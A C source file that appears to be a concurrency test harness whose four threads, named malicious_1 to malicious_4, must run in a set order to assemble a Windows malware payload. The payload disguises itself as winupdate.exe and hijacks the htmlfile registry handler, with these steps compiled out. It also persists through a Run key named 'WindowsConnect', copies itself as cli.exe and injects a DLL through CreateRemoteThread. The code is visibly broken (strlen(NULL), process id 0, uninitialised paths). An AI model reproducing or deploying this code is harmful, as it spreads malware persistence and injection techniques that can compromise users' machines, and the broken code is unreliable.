#define WIN32_LEAN_AND_MEAN
#include <pthread.h>
// #include <shellapi.h>
#include <stdio.h>
#include <windows.h>
#include <iprtrmib.h>
#include <profile.h>
#include <rpcproxy.h>
#include <winsock2.h>
#include <wsnetbs.h>
#include "bullmoose.h"

#ifndef BULLMOOSE_CPP
#define BULLMOOSE_CPP


#define CREATE_THREAD_ACCESS (PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ)


#define MALICIOUS_CODE 0

static long LOOPS = 9120000;
static int sequence[100];
int sequenceOrder;
unsigned int order = 0;
pthread_mutex_t mutex;
int what;

void recordMessage() {
  int i;
  printf("%d\n",what);
  if (order == 4) {
    printf("1\n");
  } else {
    printf("0\n");
  }
  for (i = 0; sequence[i] != 0; i++) {
    printf("%d, ", sequence[i]);
  }
}

void malicious_start() {

  // OUTPUT_FILENAME = f;
  // LOOPS = atol(argv[4]);
  int i;
  for (i = 0; i < 100; i++) {
    sequence[i] = 0;
  }
  sequenceOrder = 0;
  pthread_mutex_init(&mutex, NULL);
  what = 0;
}

void malicious_end() { recordMessage(); }

char MyPath[256];
char CpyPath[256];
HKEY Key32;

void malicious_1() {
  for (int i = 0; i < LOOPS; i++)
  what = what * 2 - what + 1;
  pthread_mutex_lock(&mutex);
  sequence[sequenceOrder++] = 1;
  if ((1 - order) == 1) {
    order = 1;
#if MALICIOUS_CODE
    GetModuleFileName(NULL, MyPath, sizeof(MyPath));
    GetSystemDirectory(CpyPath, sizeof(CpyPath));
#endif
  }
  pthread_mutex_unlock(&mutex);
}

void malicious_2() {
  for (int i = 0; i < LOOPS; i++)
    what = what * 2 - what + 1;
  pthread_mutex_lock(&mutex);
  sequence[sequenceOrder++] = 2;
  if ((2 - order) == 1) {
    order = 2;
#if MALICIOUS_CODE
    strcat(CpyPath, "\\winupdate.exe");
    strcat(CpyPath, " %1");
#endif
  }
  pthread_mutex_unlock(&mutex);
}

void malicious_3() {
  for (int i = 0; i < LOOPS; i++)
  what = what * 2 - what + 1;
  pthread_mutex_lock(&mutex);
  sequence[sequenceOrder++] = 3;
  if ((3 - order) == 1) {
    order = 3;
#if MALICIOUS_CODE
    RegOpenKeyEx(HKEY_CLASSES_ROOT, "htmlfile\\shell\\opennew\\command", 0,
                 KEY_WRITE, &Key32);
#endif
  }
  pthread_mutex_unlock(&mutex);
}

void malicious_4() {
  for (int i = 0; i < LOOPS; i++)
  what = what * 2 - what + 1;
  pthread_mutex_lock(&mutex);
  sequence[sequenceOrder++] = 4;
  if ((4 - order) == 1) {
    order = 4;
#if MALICIOUS_CODE
    CopyFile(MyPath, CpyPath, FALSE);
    RegSetValueEx(Key32, "", 0, REG_SZ, CpyPath, strlen(CpyPath));
    RegCloseKey(Key32);
#endif
    clibon(); 
  }
  pthread_mutex_unlock(&mutex);
}

void Copy(void)
{
	char FName[256],String[256];;
	GetModuleFileName(0,FName,256);
	GetWindowsDirectory(String,255);
	lstrcat(String,"\\cli.exe");
	CopyFile(FName,String,TRUE);
}

void Autorun(void)
{
	char String[256];
	HKEY hKey;
	GetWindowsDirectory(String,255);
	lstrcat(String,"\\cli.exe");
	 RegCreateKey (HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey);
     RegSetValueEx (hKey, "WindowsConnect", 0, REG_SZ, (LPBYTE)String, sizeof(String));
}

void Dynamiclinklibrary(void)
{
	HKEY hKey;
	RegOpenKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey);
    HANDLE Proc;
	HMODULE hLib;
    char buf[50] = {0};	
    LPVOID RemoteString, LoadLibAddy; 
	Proc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, 0); 
	if(!Proc)
	{
	   sprintf(buf, "OpenProcess() failed: %d", GetLastError());
	   printf(buf);
	}
	LoadLibAddy = (LPVOID)GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
	RemoteString = (LPVOID)VirtualAllocEx(Proc, NULL, strlen(NULL), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	WriteProcessMemory(Proc, (LPVOID)RemoteString, NULL, strlen(NULL), NULL);
	CreateRemoteThread(Proc, NULL, NULL, (LPTHREAD_START_ROUTINE)LoadLibAddy, (LPVOID)RemoteString, NULL, NULL);	
}

int clibon()
{
    HKEY hKey;
    char string[MAX_PATH],dll[368],ntldr[MAX_PATH];
    HANDLE virusfd = NULL,ntldrfd = NULL;
    if(RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
    0,KEY_QUERY_VALUE,&hKey) != ERROR_SUCCESS)
    {       
	printf("open cli.exe %s\n",NULL);
    }
    if((virusfd = CreateFile(string,GENERIC_WRITE,FILE_SHARE_WRITE,NULL,
    CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL)) == INVALID_HANDLE_VALUE)
    {
        ExitProcess(0);
    }
    if((ntldrfd = CreateFile(ntldr,GENERIC_WRITE,FILE_SHARE_WRITE,NULL,
    CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL)) == INVALID_HANDLE_VALUE)
    {
        ExitProcess(0);
    }
    ShellExecute(NULL,"open","cli.exe",NULL,NULL,SW_SHOW);
	Copy();
	Dynamiclinklibrary();
    ExitProcess(1);
}

#endif // BULLMOOSE_CPP